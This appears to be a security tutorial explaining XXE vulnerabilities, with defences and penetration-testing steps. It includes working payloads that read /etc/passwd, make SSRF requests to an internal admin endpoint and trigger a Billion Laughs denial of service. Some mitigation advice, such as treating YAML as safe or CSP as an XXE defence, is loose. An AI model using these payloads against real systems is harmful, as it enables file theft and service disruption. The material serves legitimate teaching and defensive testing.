### **What is XML External Entity (XXE)?**

An **XML External Entity (XXE)** vulnerability occurs when an application parses XML input that includes references to external entities without proper validation or restriction. This can allow attackers to exploit the XML parser to access sensitive files, perform server-side request forgery (SSRF), or execute other malicious actions.

---

### **How Does XXE Work?**

XML allows the definition of **entities**—shortcuts for data that can include external references (e.g., files or URLs). If the XML parser is misconfigured or too permissive, an attacker can define malicious external entities in their XML input and cause the server to process them.

#### **Example of Malicious XML Input:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

- **What Happens:** The XML parser fetches the `/etc/passwd` file and substitutes its content where `&xxe;` is referenced, potentially exposing sensitive server information.

---

### **Vulnerabilities of XXE**

XXE vulnerabilities arise from:

1. **Improper Configuration of XML Parsers:**
    - Many XML parsers, by default, allow external entities or system-level resource access.
2. **Unvalidated XML Input:**
    - Applications that accept and process user-supplied XML without sanitizing or restricting it.

#### **Types of XXE Attacks:**

1. **File Disclosure:**
    
    - Reading sensitive files on the server, such as configuration files, logs, or environment variables.
    - Example: Fetching `/etc/passwd` on Unix-like systems.
2. **Server-Side Request Forgery (SSRF):**
    
    - Forcing the server to make HTTP requests to arbitrary domains.
    - Example: Using `http://` in the external entity to access internal services.
3. **Denial of Service (DoS):**
    
    - Overloading the parser using recursive or large entities, such as a **Billion Laughs Attack.**
    - Example:
        
        ```xml
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
        ```
        
4. **Port Scanning and Network Enumeration:**
    
    - Using the server as a proxy to identify open ports or services in an internal network.
5. **Remote Code Execution (RCE):**
    
    - In rare cases, exploiting insecure external entities to execute arbitrary code.

---

### **Exploiting XXE**

Attackers exploit XXE vulnerabilities by injecting malicious XML into inputs processed by the server. Common exploitation scenarios include:

#### **1. File Disclosure**

- **Payload:**
    
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <root>
      <data>&xxe;</data>
    </root>
    ```
    
- **Result:** The server includes the content of `/etc/passwd` in its response.
    

#### **2. SSRF**

- **Payload:**
    
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "http://internal-service.local/admin">
    ]>
    <root>
      <data>&xxe;</data>
    </root>
    ```
    
- **Result:** The server makes an HTTP request to `http://internal-service.local/admin` and returns or processes the response.
    

#### **3. Billion Laughs (DoS)**

- **Payload:**
    
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
      <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;">
    ]>
    <root>
      <data>&lol4;</data>
    </root>
    ```
    
- **Result:** The XML parser consumes massive resources, potentially crashing the application.
    

---

### **Defending Against XXE**

To prevent XXE attacks, secure the XML parsing process as follows:

#### **1. Disable External Entity Processing:**

- Configure the XML parser to disable the loading of external entities.
- Example (Java):
    
    ```java
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    ```
    

#### **2. Use Modern Libraries:**

- Use libraries that do not support external entities or XML parsing by default, such as `JSON` or `YAML`.

#### **3. Validate Input:**

- Sanitize and validate user-supplied XML to ensure it does not contain malicious elements.

#### **4. Limit File/System Access:**

- Run applications with minimal privileges, limiting their ability to access sensitive files or networks.

#### **5. Use Static Analysis Tools:**

- Scan the codebase for unsafe XML parsing configurations.

#### **6. Enforce Content Security Policy (CSP):**

- Mitigate downstream risks of XXE through additional security layers, such as CSP for browser interactions.

---

### **Detecting and Exploiting XXE in Penetration Testing**

#### **Steps for Testing XXE Vulnerabilities:**

1. **Identify XML Inputs:**
    
    - Look for functionalities like file uploads, API endpoints, or SOAP services that process XML.
2. **Inject Payloads:**
    
    - Inject basic XXE payloads to test for file disclosure:
        
        ```xml
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ```
        
3. **Check for SSRF:**
    
    - Test whether external entities allow the server to make network requests.
4. **Test for DoS:**
    
    - Inject recursive or large payloads to evaluate the application’s resilience to resource exhaustion.

#### **Tools for XXE Testing:**

- **Burp Suite:** Intercept and modify XML-based requests.
- **OWASP ZAP:** Automate XXE testing.
- **XXE Injection Payload List:** Use resources like payload lists from public repositories (e.g., OWASP Cheatsheet).

---

### **Conclusion**

**XML External Entity (XXE)** vulnerabilities can have severe consequences, including data breaches, server compromise, and denial of service. Ensuring that XML parsers are configured securely and testing for XXE during application development and penetration testing are essential steps in mitigating this risk. For modern applications, consider transitioning to safer data formats like JSON to further reduce exposure to XXE attacks.
